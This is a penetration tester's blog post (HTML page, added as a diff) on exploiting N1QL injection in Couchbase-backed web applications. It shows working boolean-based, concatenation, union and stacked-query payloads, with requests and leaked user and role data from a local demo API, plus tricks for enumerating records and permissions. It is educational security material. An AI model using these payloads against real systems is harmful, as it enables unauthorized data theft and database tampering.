@@ -1,0 +1,565 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>N1QL Injection - Part 2 // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.b5f4fee110fa265e5b82f29f928caec6ee475bcd8dc3c01bc4a65205cec04336.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+  
+    
+      
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="N1QL Injection - Part 2">
+  <meta name="twitter:description" content="Exploiting N1QL injection.">
+
+    <meta property="og:url" content="https://felsec.com/posts/n1qlinjection-part2/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="N1QL Injection - Part 2">
+  <meta property="og:description" content="Exploiting N1QL injection.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-31T20:41:34+01:00">
+    <meta property="article:modified_time" content="2024-10-31T20:41:34+01:00">
+    <meta property="article:tag" content="Injection">
+    <meta property="article:tag" content="Couchbase">
+    <meta property="article:tag" content="N1QL">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester. Security Enthusiast. Husband. Cat Dad.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">N1QL Injection - Part 2</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 31, 2024
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          12 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://felsec.com/tags/injection/">Injection</a>
+              <a class="tag" href="https://felsec.com/tags/couchbase/">Couchbase</a>
+              <a class="tag" href="https://felsec.com/tags/n1ql/">N1QL</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="introduction">Introduction</h2>
+<p>In the last post we delved into the fundamentals of N1QL, N1QL injection, and identifying vulnerable endpoints (<a href="/posts/n1qlinjection-part1">Part 1</a>). In this post, we&rsquo;re shifting focus to exploiting N1QL injection, and covering some handy techniques to streamline the process.</p>
+<p>Much like classic SQL injection, data extraction follows the process of identifying valid tables (buckets within Couchbase) and using the available functions to request the fields and data. One of the big benefits offered by the N1QL query language, and there are a few from an attackers perspective, is the ability to use the <code>BASE64</code> and <code>ENCODE_JSON</code> functions that return the data either base64 encoded or in JSON format.</p>
+<h2 id="exploit-types">Exploit Types</h2>
+<p>There are 4 main methods for exploiting N1QL injection:</p>
+<ol>
+<li>Boolean-Based</li>
+<li>String Concatenation</li>
+<li>Union-Based</li>
+<li>Stacked Queries</li>
+</ol>
+<p>There is a 5<sup>th</sup> method, Error-Based, which can be used for extracting information about N1QL queries but it has limited ability to extract data from the database. We will loosely cover this one further down in the post but it is not that useful when compared to the other ones above.</p>
+<p>One small blessing with N1QL injection is that there are no Time-Based exploitation methods!!</p>
+<!-- raw HTML omitted -->
+<p><img src="/posts/yay.webp" alt="Yay!"></p>
+<p>This is largely due to N1QL not having <code>delay</code> or <code>waitfor</code> functions.</p>
+<h3 id="boolean-based">Boolean-Based</h3>
+<p>Boolean-based N1QL injection, much like standard SQLi, is where an attacker uses boolean conditions (<code>1=1</code>, <code>’a’=’b’</code>, etc.) to manipulate the database into returning a true or false response (for example, returning a valid response compared to return an empty response or an error), gradually revealing the data from the database.</p>
+<p>This method is generally used when the HTTP response do not contain the results of the relevant N1QL query or any database error details.
+One big downside to this method is that it can be very slow, depending on the amount of data we are attempting to retrieve from the database.</p>
+<p>Now that we know what this is, how do we use it?</p>
+<p>Here we have two options, each with their own trade-offs:</p>
+<ul>
+<li>Option 1: Use the <code>BASE64</code> function. Quicker due to the smaller character set but requires us to check the length or compare the result to a specific string (<code>W10=</code>) to determine if we have an empty JSON array.</li>
+<li>Option 2: Use the <code>ENCODE_JSON</code> function. Slower due to the bigger character set required, but quicker to identify valid responses as we can check for the <code>{</code> and <code>}</code> at specific locations.</li>
+</ul>
+<p>Both are valid and ultimately it is down to personal preference which method you go for. I, personally, found option 1 to work more reliably for me so that is the one I will demonstrate here.</p>
+<p>Both methods use the same base payload:</p>
+<p><code>AND SUBSTR([BASE64|ENCODE_JSON]((&lt;query&gt;)),&lt;character position to check&gt;,1)='&lt;character&gt;'</code></p>
+<p>For example:</p>
+<p><code>AND SUBSTR(BASE64((select * from system:my_user_info)),0,1)='W'</code></p>
+<p>Request - Fail:</p>
+<pre tabindex="0"><code>GET /api/blog/p1&#39;AND%20SUBSTR(BASE64((select%20*%20from%20system:my_user_info)),0,1)=&#39;A HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response - Fail:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 12
+Connection: close
+
+[{&#34;$1&#34;:[]}]
+</code></pre><p>Request - Success:</p>
+<pre tabindex="0"><code>GET /api/blog/p1&#39;AND%20SUBSTR(BASE64((select%20*%20from%20system:my_user_info)),0,1)=&#39;W HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response - Success:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 130
+Connection: close
+
+[
+  {
+    &#34;$1&#34;: [
+      {
+        &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
+        &#34;id&#34;: &#34;p1&#34;,
+        &#34;title&#34;: &#34;Coffee Benefits&#34;
+      }
+    ]
+  }
+]
+</code></pre><p>This method can also be used to get the length of the encrypted payload, which can then be used to make retrieving the data more efficient.</p>
+<p>Payload:</p>
+<p><code>AND LEN(BASE64((select * from system:my_user_info)),0,1)=&lt;size&gt;;--</code></p>
+<p>Request:</p>
+<pre tabindex="0"><code>GET /api/blog/p1&#39;AND%20LEN(BASE64((select%20*%20from%20system:my_user_info)))=880)-- HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 130
+Connection: close
+
+[
+  {
+    &#34;$1&#34;: [
+      {
+        &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
+        &#34;id&#34;: &#34;p1&#34;,
+        &#34;title&#34;: &#34;Coffee Benefits&#34;
+      }
+    ]
+  }
+]
+</code></pre><h3 id="string-concatenation">String Concatenation</h3>
+<p>String concatenation based N1QL injection is similar to boolean-based N1QL injection, however rather than just relying on the true or false statements to control the output we can choose to create a valid or an invalid query value based on a boolean statement.</p>
+<p>In the case of the N1QL query language this can be achieved either using the String function <code>REPLACE</code> or searched case expressions (<a href="https://docs.couchbase.com/server/current/n1ql/n1ql-language-reference/conditionalops.html#searched-case-expressions">Searched Case Expressions</a>).</p>
+<p>The following payloads show how these functions can be used:</p>
+<p><code>p'||REPLACE(SUBSTR(BASE64((select b.* from blog_posts as b order by meta().id limit 1 offset 0)),0,1),'W','')||'1</code></p>
+<p><code>p'||(SELECT CASE WHEN SUBSTR(BASE64((select b.* from blog_posts as b order by meta().id limit 1 offset 0)),0,1)='W'THEN'1'ELSE''END)</code></p>
+<p>In both cases we can take a known value that returns a valid response and use string concatenation to add or insert a character depending on the output of our injected query. For example, inserting the character &lsquo;<code>!</code>&rsquo; for a false statement or an empty string for a true statement. This in turn makes the parent query fail or succeed allowing for the extraction of data.</p>
+<p>Request - Fail:</p>
+<pre tabindex="0"><code>GET /api/blog/p&#39;||REPLACE(SUBSTR(BASE64((select%20b.*%20from%20blog_posts%20as%20b%20order%20by%20meta().id%20limit%201%20offset%200)),0,1),&#39;A&#39;,&#39;&#39;)||&#39;1 HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response - Fail:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 12
+Connection: close
+
+[{&#34;$1&#34;:[]}]
+</code></pre><p>Request - Success:</p>
+<pre tabindex="0"><code>GET /api/blog/p&#39;||REPLACE(SUBSTR(BASE64((select%20b.*%20from%20blog_posts%20as%20b%20order%20by%20meta().id%20limit%201%20offset%200)),0,1),&#39;W&#39;,&#39;&#39;)||&#39;1 HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response - Success:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 130
+Connection: close
+
+[
+  {
+    &#34;$1&#34;: [
+      {
+        &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
+        &#34;id&#34;: &#34;p1&#34;,
+        &#34;title&#34;: &#34;Coffee Benefits&#34;
+      }
+    ]
+  }
+]
+</code></pre><h3 id="union-based">Union-Based</h3>
+<p>Union-based N1QL injection is where we use the <code>UNION</code> keyword to combine two N1QL queries into a single response. Much like SQLi this method is only viable when the data is returned in the HTTP response; however, unlike standard SQLi, which has a few restrictions when performing union-based attacks (the queries must return the same number of columns and the data types must be compatible), N1QL has no restrictions when performing union-based attacks. In the N1QL query language, the purpose of the <code>UNION</code> keyword is to combine two or more documents into a new single document for use by the target application, in a similar way that fragments are used in GraphQL.</p>
+<p>As attackers, we can use this feature of the language to quickly and easily extract large amounts of data from the database.</p>
+<p>For example:</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>p1&#39; union select*from system:my_user_info where &#39;testing&#39;=&#39;testing
+</code></pre><p>Request:</p>
+<pre tabindex="0"><code>GET /api/blog/p1&#39;%20union%20select*from%20system:my_user_info%20where%20&#39;testing&#39;=&#39;testing HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 789
+Connection: close
+
+[
+  {
+    &#34;$1&#34;: [
+      {
+        &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
+        &#34;id&#34;: &#34;p1&#34;,
+        &#34;title&#34;: &#34;Coffee Benefits&#34;
+      },
+      {
+        &#34;my_user_info&#34;: {
+          &#34;domain&#34;: &#34;local&#34;,
+          &#34;external_groups&#34;: [],
+          &#34;groups&#34;: [],
+          &#34;id&#34;: &#34;fletcher_one&#34;,
+          &#34;password_change_date&#34;: &#34;2024-04-17T09:30:35.000Z&#34;,
+          &#34;roles&#34;: [...[SNIPPED]...],
+          &#34;uuid&#34;: &#34;071cf34e-5415-466f-87b9-c80397322d58&#34;
+        }
+      }
+    ]
+  }
+]
+</code></pre><h3 id="stacked-queries">Stacked Queries</h3>
+<p>Stacked queries is where we inject multiple queries into a single statement by terminating the initial query. In N1QL injection stacked queries can be used in a few different ways.</p>
+<p>Firstly, we can use this method in the same way we would for normal SQL injection. Terminating the original query and appending additional queries to perform various actions on the database (add, remove or modify data, delete buckets, etc.). For example:</p>
+<p><code>value';UPSERT INTO bucket (KEY, VALUE) VALUES(&quot;injected-1&quot;, {&quot;injected&quot;:&quot;stacked-query&quot;}) RETURNING 'INJECTED</code></p>
+<p><em><strong>Note:</strong> In order to use the <code>UPSERT</code> keyword the user must have the <code>Query Update</code> and <code>Query Insert</code> privileges.</em></p>
+<p>Secondly, if the initial query is surrounded in brackets <code>()</code> then we can use the stacked queries in a similar way to union-based N1QL injection to append our additional queries and have the output returned alongside the original data. For example:</p>
+<p>Payload:</p>
+<p><code>p1'),(select * from system:my_user_info where 'testing'='testing</code></p>
+<p>Request:</p>
+<pre tabindex="0"><code>GET /api/blog/p1&#39;),(select*from%20system:my_user_info%20where%20&#39;testing&#39;=&#39;testing HTTP/1.1
+Host: localhost
+User-Agent: FelSec-Example
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Content-Type: application/json
+Content-Length: 796
+Connection: close
+
+[
+  {
+    &#34;$1&#34;: [
+      {
+        &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
+        &#34;id&#34;: &#34;p1&#34;,
+        &#34;title&#34;: &#34;CoffeeBenefits&#34;
+      }
+    ],
+    &#34;$2&#34;: [
+      {
+        &#34;my_user_info&#34;: {
+          &#34;domain&#34;: &#34;local&#34;,
+          &#34;external_groups&#34;: [],
+          &#34;groups&#34;: [],
+          &#34;id&#34;: &#34;fletcher_one&#34;,
+          &#34;password_change_date&#34;: &#34;2024-04-17T09:30:35.000Z&#34;,
+          &#34;roles&#34;: [...[SNIPPED]...],
+          &#34;uuid&#34;: &#34;071cf34e-5415-466f-87b9-c80397322d58&#34;
+        }
+      }
+    ]
+  }
+]
+</code></pre><h3 id="error-based">Error-Based</h3>
+<p>Error-based N1QL injection is similar to standard SQL injection, however there is one key difference. In normal error-based SQL injection the error returns the full SQL query strings, full query results, or information that can be used in further injection attempts but with Couchbase and the N1QL query language only a portion of the affected query is returned. This can still allow us to retrieve information about the backend database (bucket names, field names, conditions being used, etc.) that we can use in further exploit attempts, but offers limited information and benefits compared to other methods.</p>
+<h5 id="example-error-messages">Example Error Messages</h5>
+<p><strong>Missing Bucket</strong></p>
+<pre tabindex="0"><code>Request:
+curl http://localhost:8093/query/service -d &#39;statement=SELECT name FROM `travel-sample`.inventory.motel LIMIT 1&#39; -u Administrator:Passw0rd
+
+Response:
+{
+  &#34;requestID&#34;: &#34;0fcb0b4c-cc23-4ece-b848-c1b9af70c78f&#34;,
+  &#34;errors&#34;: [
+    {
+      &#34;code&#34;: 12003,
+      &#34;column&#34;: 18,
+      &#34;line&#34;: 1,
+      &#34;msg&#34;: &#34;Keyspace not found in CB datastore: default:travel-sample (near line 1, column 18) - cause: No bucket named travel-sample&#34;
+    }
+  ],
+  &#34;status&#34;: &#34;fatal&#34;,
+  &#34;metrics&#34;: {
+    &#34;elapsedTime&#34;: &#34;22.151518ms&#34;,
+    &#34;executionTime&#34;: &#34;21.756576ms&#34;,
+    &#34;resultCount&#34;: 0,
+    &#34;resultSize&#34;: 0,
+    &#34;serviceLoad&#34;: 6,
+    &#34;errorCount&#34;: 1
+  }
+}
+</code></pre><p><strong>Invalid Quoted String</strong></p>
+<pre tabindex="0"><code>Request:
+curl http://localhost:8093/query/service -d &#39;statement=SELECT name FROM `beer-sample` WHERE name=\&#39;abcsc &#39; -u Administrator:Passw0rd
+
+Response:
+{
+  &#34;requestID&#34;: &#34;7fe26cff-ee26-4cfb-b83e-f49f386fe626&#34;,
+  &#34;errors&#34;: [
+    {
+      &#34;code&#34;: 3000,
+      &#34;column&#34;: 43,
+      &#34;line&#34;: 1,
+      &#34;msg&#34;: &#34;syntax error: invalid quoted string - missing closing quote - line 1, column 43, near &#39;...-sample` WHERE name=&#39;, at: &#39;abcsc&#34;
+    }
+  ],
+  &#34;status&#34;: &#34;fatal&#34;,
+  &#34;metrics&#34;: {
+    &#34;elapsedTime&#34;: &#34;4.34463ms&#34;,
+    &#34;executionTime&#34;: &#34;3.636005ms&#34;,
+    &#34;resultCount&#34;: 0,
+    &#34;resultSize&#34;: 0,
+    &#34;serviceLoad&#34;: 6,
+    &#34;errorCount&#34;: 1
+  }
+}
+</code></pre><p><strong>Invalid Escape Identifier</strong></p>
+<pre tabindex="0"><code>Request:
+curl http://localhost:8093/query/service -d &#39;statement=SELECT name FROM `beer-sample`.`name &#39; -u Administrator:Passw0rd
+
+Response:
+{
+  &#34;requestID&#34;: &#34;9738c09b-c463-45f7-bf9d-b238f642f982&#34;,
+  &#34;errors&#34;: [
+    {
+      &#34;code&#34;: 3000,
+      &#34;column&#34;: 32,
+      &#34;line&#34;: 1,
+      &#34;msg&#34;: &#34;syntax error: invalid escaped identifier - missing closing quote - line 1, column 32, near &#39;...FROM `beer-sample`.&#39;, at: `name&#34;
+    }
+  ],
+  &#34;status&#34;: &#34;fatal&#34;,
+  &#34;metrics&#34;: {
+    &#34;elapsedTime&#34;: &#34;2.863714ms&#34;,
+    &#34;executionTime&#34;: &#34;2.583399ms&#34;,
+    &#34;resultCount&#34;: 0,
+    &#34;resultSize&#34;: 0,
+    &#34;serviceLoad&#34;: 6,
+    &#34;errorCount&#34;: 1
+  }
+}
+</code></pre><p><strong>Ambiguous Field</strong></p>
+<pre tabindex="0"><code>Request:
+curl http://localhost:8093/query/service -d &#39;statement=SELECT name FROM `beer-sample`.name &#39; -u Administrator:Passw0rd
+
+Response:
+{
+  &#34;requestID&#34;: &#34;883093d4-23aa-433d-b99f-9d5c19b12b80&#34;,
+  &#34;errors&#34;: [
+    {
+      &#34;code&#34;: 3080,
+      &#34;column&#34;: 18,
+      &#34;line&#34;: 1,
+      &#34;msg&#34;: &#34;Ambiguous reference to field &#39;beer-sample&#39; (near line 1, column 18).&#34;
+    }
+  ],
+  &#34;status&#34;: &#34;fatal&#34;,
+  &#34;metrics&#34;: {
+    &#34;elapsedTime&#34;: &#34;4.891704ms&#34;,
+    &#34;executionTime&#34;: &#34;4.482279ms&#34;,
+    &#34;resultCount&#34;: 0,
+    &#34;resultSize&#34;: 0,
+    &#34;serviceLoad&#34;: 6,
+    &#34;errorCount&#34;: 1
+  }
+}
+</code></pre><p>As you can see these error messages give us snippets of information that can be used to build or adjust our injection payloads, but do not return any query results.</p>
+<h2 id="challenges-and-useful-tricks">Challenges and Useful Tricks</h2>
+<h3 id="getting-the-bucket-record-count">Getting the Bucket Record Count</h3>
+<p>One main challenge I came across when attempting to exfiltrate data during assessments was knowing how many records or documents were in a particular bucket. While you could, and I did, take the blind approach and keep iterating over the records until no data or empty responses were returned (<code>[{}]</code>).</p>
+<p>However, after a bit of digging in the N1QL documentation and doing some experimentation, I found a couple of reliable methods.</p>
+<p><strong>Method 1: The SQL Way</strong></p>
+<p>The first method was to use the <code>COUNT</code> function to just count the number of records in the bucket.</p>
+<p><code>SELECT COUNT(*) FROM BUCKETNAME</code></p>
+<p>While this approach is simple and does work, it requires the query to get and process all the records. Meaning that the greater number of records the longer it takes to process the query, potentially causing the web requests to timeout.</p>
+<p>There is a better way&hellip;</p>
+<p><strong>Method 2: system:keyspaces_info</strong></p>
+<p>Couchbase has several system keyspaces that are used to hold information about various aspects of the database (users, roles, nodes, buckets, etc.). A lesser documented one is <code>keyspaces_info</code>, which contains the same information as the <code>keyspaces</code> keyspace (namespace info, bucket name, id and path), but crucially also contains the field <code>count</code> which is a count of all the records within each bucket.</p>
+<p>Since this information is automatically updated and maintained by the database server, it is faster to get and has less impact on the server.</p>
+<p>By using the following query we can get the record count for any bucket in the database:</p>
+<p><code>SELECT count FROM system:keyspaces_info where name='BUCKET NAME'</code></p>
+<pre tabindex="0"><code>Query: SELECT count from system:keyspaces_info where name=&#39;beer-sample&#39;;
+
+Output:
+[
+  {
+    &#34;count&#34;: 7303
+  }
+]
+</code></pre><h3 id="checking-user-permissions">Checking User Permissions</h3>
+<p>Couchbase has a fairly granular permission system and to access certain functionality or keyspaces, the user performing the query must be assigned certain roles.</p>
+<p>Meaning that the ability to check the roles assigned to the user is really useful. This can be done a few ways:</p>
+<p>The first way is to dump the whole <code>system:my_user_info</code> table and reviewing the roles assigned to the current user. This can be great for getting an overall view of what buckets they are allowed to access and what actions they are allowed to perform, e.g. query only, query and update, update only, etc.</p>
+<pre tabindex="0"><code>Query: SELECT * FROM system:my_user_info
+
+Output:
+[
+  {
+    &#34;my_user_info&#34;: {
+      &#34;domain&#34;: &#34;local&#34;,
+      &#34;external_groups&#34;: [],
+      &#34;groups&#34;: [],
+      &#34;id&#34;: &#34;fletcher_one&#34;,
+      &#34;password_change_date&#34;: &#34;2024-04-17T09:30:35.000Z&#34;,
+      &#34;roles&#34;: [
+        {
+          &#34;bucket_name&#34;: &#34;bucket2&#34;,
+          &#34;collection_name&#34;: &#34;*&#34;,
+          &#34;origins&#34;: [
+            {
+              &#34;type&#34;: &#34;user&#34;
+            }
+          ],
+          &#34;role&#34;: &#34;select&#34;,
+          &#34;scope_name&#34;: &#34;*&#34;
+        },
+        {
+          &#34;bucket_name&#34;: &#34;bucket1&#34;,
+          &#34;collection_name&#34;: &#34;*&#34;,
+          &#34;origins&#34;: [
+            {
+              &#34;type&#34;: &#34;user&#34;
+            }
+          ],
+          &#34;role&#34;: &#34;select&#34;,
+          &#34;scope_name&#34;: &#34;*&#34;
+        },
+        {
+          &#34;bucket_name&#34;: &#34;bucket2&#34;,
+          &#34;collection_name&#34;: &#34;*&#34;,
+          &#34;origins&#34;: [
+            {
+              &#34;type&#34;: &#34;user&#34;
+            }
+          ],
+          &#34;role&#34;: &#34;data_reader&#34;,
+          &#34;scope_name&#34;: &#34;*&#34;
+        },
+        {
+          &#34;bucket_name&#34;: &#34;bucket1&#34;,
+          &#34;collection_name&#34;: &#34;*&#34;,
+          &#34;origins&#34;: [
+            {
+              &#34;type&#34;: &#34;user&#34;
+            }
+          ],
+          &#34;role&#34;: &#34;data_reader&#34;,
+          &#34;scope_name&#34;: &#34;*&#34;
+        }
+      ],
+      &#34;uuid&#34;: &#34;071cf34e-5415-466f-87b9-c80397322d58&#34;
+    }
+  }
+]
+</code></pre><p>However, if we want to check for a specific role or permission this can be done with the following query:</p>
+<pre tabindex="0"><code>select r from system:my_user_info UNNEST roles as r where r.`role`=&#39;ROLE&#39;
+</code></pre><p>We can monitor the responses to identify whether the user has the requested permission. If the user has a specific role then the role information will be returned, including the buckets this permission applies to, whereas an empty response is returned when the user does not have the role. For example:</p>
+<p><strong>Valid Role</strong></p>
+<pre tabindex="0"><code>Query: select r from system:my_user_info UNNEST roles as r where r.`role`=&#39;data_reader&#39;
+
+Output:
+[
+  {
+    &#34;r&#34;: {
+      &#34;bucket_name&#34;: &#34;bucket2&#34;,
+      &#34;collection_name&#34;: &#34;*&#34;,
+      &#34;origins&#34;: [
+        {
+          &#34;type&#34;: &#34;user&#34;
+        }
+      ],
+      &#34;role&#34;: &#34;data_reader&#34;,
+      &#34;scope_name&#34;: &#34;*&#34;
+    }
+  },
+  {
+    &#34;r&#34;: {
+      &#34;bucket_name&#34;: &#34;bucket1&#34;,
+      &#34;collection_name&#34;: &#34;*&#34;,
+      &#34;origins&#34;: [
+        {
+          &#34;type&#34;: &#34;user&#34;
+        }
+      ],
+      &#34;role&#34;: &#34;data_reader&#34;,
+      &#34;scope_name&#34;: &#34;*&#34;
+    }
+  }
+]
+</code></pre><p><strong>Invalid or Unassigned Role</strong></p>
+<pre tabindex="0"><code>Query: select r from system:my_user_info UNNEST roles as r where r.`role`=&#39;admin&#39;
+
+Output:
+[]
+</code></pre><p>A full breakdown of the Couchbase roles can be found here: <a href="https://docs.couchbase.com/server/current/learn/security/roles.html">Couchbase Roles</a></p>
+<h3 id="length-of-length">Length of Length</h3>
+<p>A useful trick I learned for helping with boolean-based N1QL injection, particularly when trying to identify the length of the data being returned, was that the <code>LEN</code> function can be stacked to get the length of the length. Meaning that:</p>
+<ul>
+<li>For <code>0-9</code> the length would be 1;</li>
+<li>For <code>10-99</code> the length would be 2;</li>
+<li>For <code>100-999</code> the length would be 3</li>
+<li>etc.</li>
+</ul>
+<p>This, along with the fact that a Base64 string will always be a multiple of 4, allows us to heavily reduce the number of requests required to obtain the length of the data.</p>
+<p>Continue reading part 3 for some interesting features of N1QL and Couchbase, more exploits, and some additional useful tools and resources. <a href="/posts/n1qlinjection-part3">Part 3</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
